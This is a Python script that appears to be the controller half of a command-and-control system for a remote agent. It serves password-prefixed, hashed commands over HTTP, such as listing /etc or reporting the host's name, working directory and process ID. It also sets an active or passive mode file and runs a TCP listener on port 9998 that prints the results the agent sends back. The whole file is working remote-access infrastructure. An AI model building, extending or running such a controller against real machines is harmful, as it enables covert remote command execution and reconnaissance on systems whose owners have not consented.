import socketserver
import http.server
import hashlib
import threading
# import ssl

PORT = 9998

class TCPHandler(socketserver.BaseRequestHandler):

    def handle(self):
        """Recieve incoming data from agent
        """
        self.data = self.request.recv(2048).strip()
        print(str(self.data, "utf-8"))



def host_commands(cmds):
    """host the http server serving the commands
    Args:
        cmds (list): list of commands to host on the server
    """


    Handler = http.server.SimpleHTTPRequestHandler
    server = http.server.ThreadingHTTPServer(("0.0.0.0", PORT + 1), Handler)
    # TODO: SSL
    # server.socket = ssl.wrap_socket(server.socket, certfile='', server_side= True)

    write_commands(cmds)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    print("serving at port", PORT + 1)
    server_thread.start()


def set_mode(active):
    """Set the mode for the remote agent

    Args:
        active (bool): True if go active
    """
    f=open("mode.txt", "w")
    if active:
        f.write("active")
    else:
        f.write("passive")
    f.close()
    


def write_commands(cmds):
    """Write commands to http server

    Args:
        cmds (list): list of commands to write to http directory
    """
    f = open("commands.txt", "w")
    for cmd in cmds:
        hash = hashlib.sha256(cmd.encode("utf-8")).hexdigest()
        f.write(f"{cmd}:{hash}\n")
    f.close()


if __name__ == "__main__":
    cmds = []
    cmds.append("password:ls:/etc")
    cmds.append("password:BUILTIN:name")
    cmds.append("password:BUILTIN:cwd")
    cmds.append("password:BUILTIN:pid")

    set_mode(active=True)
    host_commands(cmds)

    with socketserver.TCPServer(("0.0.0.0", PORT), TCPHandler) as server:
        # Activate the server; this will keep running until you
        # interrupt the program with Ctrl-C
        print(f"Receiving at port {PORT}")
        server.serve_forever()